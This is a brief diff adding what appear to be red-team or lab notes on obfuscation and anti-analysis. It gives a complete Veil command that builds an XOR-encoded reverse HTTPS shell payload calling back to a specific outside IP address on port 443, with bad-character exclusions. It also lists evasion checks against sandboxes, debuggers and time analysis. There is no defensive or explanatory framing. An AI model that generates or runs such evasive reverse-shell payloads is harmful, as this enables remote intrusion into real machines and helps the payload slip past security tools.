@@ -1,0 +1,7 @@
+Obfuscation, Encryption, and Anti-Analysis
+
+.Veil.py –t Ordnance –ordnance-payload rev_https –ip 34.210.28.254 –port 443 –e xor –b \\x13\\x98
+
+Xor-encoded with 0x02
+
+Used evasion, payload #33  flat    with UTCCHECK, SANDBOX, DETECTDEBUG
